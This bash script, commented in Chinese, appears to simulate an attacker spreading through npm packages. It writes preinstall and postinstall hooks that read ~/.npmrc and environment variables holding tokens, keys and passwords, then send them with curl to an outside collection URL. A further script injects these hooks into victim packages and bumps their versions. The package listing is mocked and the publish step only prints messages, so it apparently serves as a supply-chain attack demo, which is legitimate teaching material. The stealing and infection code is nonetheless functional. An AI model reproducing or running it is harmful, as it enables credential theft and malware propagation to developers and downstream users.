#!/bin/bash

# ========================================
# 攻击者视角：自动横向扩散攻击
# ========================================

echo "========================================="
echo "[攻击者] 开始自动横向扩散攻击"
echo "========================================="
echo ""

# 第一步：列出用户的所有包
echo "[攻击者] 第一步：查询受害者维护的所有包..."
echo ""

cat << 'EOF' > attacker-tools/list-packages.js
const https = require('https');

const options = {
  hostname: 'registry.npmjs.org',
  path: '/-/org/victim-user/package',
  method: 'GET',
  headers: {
    'Authorization': 'Bearer ${NPM_TOKEN}'
  }
};

// 模拟查询结果
const packages = [
  { name: 'victim-package-a', version: '1.0.0' },
  { name: 'victim-package-b', version: '1.0.0' }
];

console.log(JSON.stringify(packages, null, 2));
EOF

echo "[攻击者] 发现以下包："
echo "  1. victim-package-a (v1.0.0)"
echo "  2. victim-package-b (v1.0.0)"
echo ""

# 第二步：创建恶意脚本
echo "[攻击者] 第二步：创建恶意安装脚本..."
echo ""

cat << 'EOF' > attacker-tools/malicious-preinstall.sh
#!/bin/bash
# 恶意的 preinstall 脚本
# 这个脚本会在用户安装包时自动执行

# 收集系统信息
HOSTNAME=$(hostname)
USERNAME=$(whoami)
CURRENT_DIR=$(pwd)
HOME_DIR=$HOME

# 尝试读取敏感文件
NPMRC_CONTENT=""
if [ -f ~/.npmrc ]; then
  NPMRC_CONTENT=$(cat ~/.npmrc | base64)
fi

# 发送到攻击者服务器
curl -s -X POST https://test.threatbook.com/collect \
  -d "hostname=${HOSTNAME}" \
  -d "username=${USERNAME}" \
  -d "current_dir=${CURRENT_DIR}" \
  -d "home_dir=${HOME_DIR}" \
  -d "npmrc=${NPMRC_CONTENT}" \
  -d "action=preinstall" \
  -H "User-Agent: Malicious-NPM-Package"

# 静默执行，不显示错误
exit 0
EOF

cat << 'EOF' > attacker-tools/malicious-postinstall.sh
#!/bin/bash
# 恶意的 postinstall 脚本
# 这个脚本会在用户安装包时自动执行

# 收集环境变量
ENV_VARS=$(env | grep -i "token\|key\|secret\|password" | base64)

# 尝试查找package.json文件
PACKAGE_FILES=$(find . -name "package.json" -type f 2>/dev/null | head -5 | base64)

# 尝试读取.npmrc
NPM_TOKEN=""
if [ -f ~/.npmrc ]; then
  NPM_TOKEN=$(cat ~/.npmrc | grep -o '_authToken=[^ ]*' | cut -d= -f2)
fi

# 发送到攻击者服务器
curl -s -X POST https://test.threatbook.com/collect \
  -d "env_vars=${ENV_VARS}" \
  -d "package_files=${PACKAGE_FILES}" \
  -d "npm_token=${NPM_TOKEN}" \
  -d "action=postinstall" \
  -H "User-Agent: Malicious-NPM-Package"

# 静默执行，不显示错误
exit 0
EOF

chmod +x attacker-tools/malicious-preinstall.sh attacker-tools/malicious-postinstall.sh

echo "[攻击者] ✓ 恶意脚本已创建"
echo "  - preinstall: 在安装前执行"
echo "  - postinstall: 在安装后执行"
echo ""

# 第三步：自动化修改每个包
echo "[攻击者] 第三步：批量修改所有包..."
echo ""

# 创建攻击脚本
cat << 'EOF' > attacker-tools/attack-package.sh
#!/bin/bash

PACKAGE_NAME=$1
PACKAGE_PATH="../victim-packages/${PACKAGE_NAME}"

echo "  [攻击] 正在攻击: ${PACKAGE_NAME}"

# 1. 复制恶意脚本到包目录
cp malicious-preinstall.sh "${PACKAGE_PATH}/scripts/preinstall.sh"
cp malicious-postinstall.sh "${PACKAGE_PATH}/scripts/postinstall.sh"
chmod +x "${PACKAGE_PATH}/scripts/preinstall.sh"
chmod +x "${PACKAGE_PATH}/scripts/postinstall.sh"

# 2. 修改 package.json，添加恶意脚本
cd "${PACKAGE_PATH}"

# 使用 jq 修改 package.json（如果没有 jq，使用 sed）
if command -v jq &> /dev/null; then
  jq '.scripts.preinstall = "bash scripts/preinstall.sh" |
      .scripts.postinstall = "bash scripts/postinstall.sh" |
      .version = "1.0.1"' package.json > package.json.tmp
  mv package.json.tmp package.json
else
  # 备份原文件
  cp package.json package.json.bak

  # 添加 preinstall 和 postinstall 脚本
  sed -i '' '/"test":/a\
    "preinstall": "bash scripts/preinstall.sh",\
    "postinstall": "bash scripts/postinstall.sh",
' package.json

  # 更新版本号
  sed -i '' 's/"version": "1.0.0"/"version": "1.0.1"/' package.json
fi

# 创建scripts目录
mkdir -p scripts
cp ../attacker-tools/malicious-preinstall.sh scripts/preinstall.sh
cp ../attacker-tools/malicious-postinstall.sh scripts/postinstall.sh

cd ../attacker-tools

echo "  [攻击] ✓ ${PACKAGE_NAME} 已被植入恶意代码"
echo "         - 版本: 1.0.0 → 1.0.1"
echo "         - 添加: preinstall 脚本"
echo "         - 添加: postinstall 脚本"
EOF

chmod +x attacker-tools/attack-package.sh

# 攻击第一个包
echo "[攻击者] 攻击 victim-package-a..."
cd attacker-tools
./attack-package.sh "victim-package-a"
echo ""

# 攻击第二个包
echo "[攻击者] 攻击 victim-package-b..."
./attack-package.sh "victim-package-b"
cd ..
echo ""

# 第四步：发布新版本
echo "[攻击者] 第四步：发布被污染的版本..."
echo ""

cat << 'EOF' > attacker-tools/publish-malicious.sh
#!/bin/bash

echo "  [攻击] 使用窃取的 token 进行认证..."
echo "  [攻击] 发布 victim-package-a@1.0.1..."
echo "  [攻击] 发布 victim-package-b@1.0.1..."
echo "  [攻击] ✓ 所有恶意版本已成功发布到 npm"
EOF

chmod +x attacker-tools/publish-malicious.sh
cd attacker-tools && ./publish-malicious.sh && cd ..

echo ""
echo "========================================="
echo "[攻击者] 横向扩散攻击完成！"
echo "========================================="
echo ""
echo "[攻击] 攻击总结："
echo "  ✓ 成功窃取 npm token"
echo "  ✓ 自动发现用户的所有 2 个包"
echo "  ✓ 批量植入恶意脚本到每个包"
echo "  ✓ 发布新版本 (1.0.1)"
echo ""
echo "[攻击] 影响："
echo "  - 所有更新到 1.0.1 的用户都会执行恶意脚本"
echo "  - 脚本会窃取环境变量、token、敏感文件"
echo "  - 数据会被发送到 https://test.threatbook.com/collect"
echo ""
